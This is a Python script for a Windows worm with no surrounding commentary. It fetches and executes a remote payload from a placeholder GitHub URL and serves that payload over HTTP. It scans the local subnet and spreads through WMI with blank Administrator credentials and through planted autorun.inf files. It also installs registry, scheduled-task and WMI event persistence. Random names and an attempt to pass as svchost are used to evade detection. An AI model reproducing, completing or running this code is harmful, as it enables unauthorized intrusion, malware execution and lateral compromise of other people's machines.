import os
import shutil
import winreg
import random
import string
import psutil
import subprocess
import socket
import threading
import sys
import requests
import urllib3
from http.server import HTTPServer, BaseHTTPRequestHandler
import wmi
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# GitHub URL for init.exe (replace with your link)
GITHUB_URL = "https://raw.githubusercontent.com/<user>/<repo>/main/init.exe"

# Polymorphic name generator
def _x0r_n4m3(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Download init.exe from GitHub
def _d0wnl04d_p4yl04d():
    try:
        rand_name = f'{_x0r_n4m3()}.exe'
        dest_path = os.path.join(os.environ['TEMP'], rand_name)
        response = requests.get(GITHUB_URL, stream=True, verify=False)
        if response.status_code == 200:
            with open(dest_path, 'wb') as f:
                f.write(response.content)
            subprocess.run([dest_path], shell=True, capture_output=True)
        return dest_path
    except:
        return None

# HTTP server to serve init.exe
class EvilHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == f'/{_x0r_n4m3()}.exe':
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.end_headers()
            payload_path = _d0wnl04d_p4yl04d() or sys.executable
            with open(payload_path or sys.executable, 'rb') as f:
                self.wfile.write(f.read())

# Start HTTP server
def _h0st_3x3():
    try:
        server = HTTPServer(('0.0.0.0', 80), EvilHTTPHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
    except:
        pass

# WMI-based lateral movement
def _wm1_spr34d(ip):
    try:
        c = wmi.WMI(computer=ip, user='Administrator', password='')  # Try default or blank creds
        rand_name = f'{_x0r_n4m3()}.exe'
        dest_path = f'\\\\{ip}\\C$\\Windows\\Temp\\{rand_name}'
        payload_path = _d0wnl04d_p4yl04d()
        if payload_path:
            shutil.copy(payload_path, dest_path)
            c.Win32_Process.Create(CommandLine=f'"{dest_path}"', CurrentDirectory='C:\\Windows\\Temp')
    except:
        pass

# RDP-based propagation (via shared clipboard or folder)
def _rdp_spr34d(ip):
    try:
        rand_name = f'{_x0r_n4m3()}.exe'
        dest_path = f'\\\\{ip}\\C$\\Users\\Public\\{rand_name}'
        payload_path = _d0wnl04d_p4yl04d()
        if payload_path:
            shutil.copy(payload_path, dest_path)
            # Create autorun.inf to trigger execution on RDP access
            autorun_path = f'\\\\{ip}\\C$\\Users\\Public\\autorun.inf'
            with open(autorun_path, 'w') as f:
                f.write(f'[AutoRun]\nopen={rand_name}\naction=Open System Update\n')
    except:
        pass

# Scan network for targets
def _sc4n_n3t():
    targets = []
    local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
    for i in range(1, 255):
        ip = f'{local_ip}.{i}'
        try:
            socket.create_connection((ip, 3389), timeout=1).close()  # Check RDP port
            targets.append(ip)
        except:
            try:
                socket.create_connection((ip, 445), timeout=1).close()  # Fallback for WMI
                targets.append(ip)
            except:
                pass
    return targets

# Infect network
def _1nf3ct_n3t(ip):
    _wm1_spr34d(ip)
    _rdp_spr34d(ip)

# Multi-threaded propagation
def _spr34d_n3t():
    targets = _sc4n_n3t()
    threads = []
    for ip in targets:
        t = threading.Thread(target=_1nf3ct_n3t, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Hide process by mimicking svchost
def _h1d3_pr0c():
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() == 'svchost.exe':
            os.environ['COMSPEC'] = proc.exe()
            break

# Persistence via Registry
def _p3rs1st_r3g():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        winreg.SetValueEx(key, _x0r_n4m3(), 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except:
        pass

# Persistence via schtasks
def _p3rs1st_t4sk():
    task_name = _x0r_n4m3()
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    cmd = f'schtasks /create /tn "{task_name}" /tr "\"{exe_path}\"" /sc daily /st 00:00 /ru SYSTEM'
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Persistence via process creation trigger
def _p3rs1st_pr0c():
    try:
        c = wmi.WMI()
        event_filter = c.__EventFilter(
            Name=_x0r_n4m3(),
            Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
        )
        consumer = c.Win32_CommandLineEventConsumer(
            Name=_x0r_n4m3(),
            CommandLineTemplate=f'"{sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)}"'
        )
        c.__FilterToConsumerBinding(
            Filter=f"__EventFilter.Name='{event_filter.Name}'",
            Consumer=f"Win32_CommandLineEventConsumer.Name='{consumer.Name}'"
        )
    except:
        pass

# Main execution
if __name__ == '__main__':
    import sys
    _d0wnl04d_p4yl04d()  # Download and run init.exe
    _h0st_3x3()  # Start HTTP server
    _h1d3_pr0c()
    _p3rs1st_r3g()
    _p3rs1st_t4sk()
    _p3rs1st_pr0c()
    _spr34d_n3t()